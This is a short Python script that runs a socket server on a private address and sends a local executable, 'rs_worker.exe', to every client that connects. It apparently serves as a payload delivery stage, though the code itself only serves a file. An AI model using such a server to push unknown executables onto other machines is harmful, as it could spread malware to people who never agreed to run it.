import socket

def download_worker() ->bytes:
    with open("rs_worker.exe","rb") as file:
        file_bytes = file.read()
    return file_bytes

def main():
    server = socket.socket()
    server.bind(("10.0.0.1",5555))
    server.listen()
    while True:
        client, client_address = server.accept()
        print(client.recv(1024))
        client.send(download_worker())
        client.close()
        client = socket.socket()



if __name__ =='__main__':
    main()

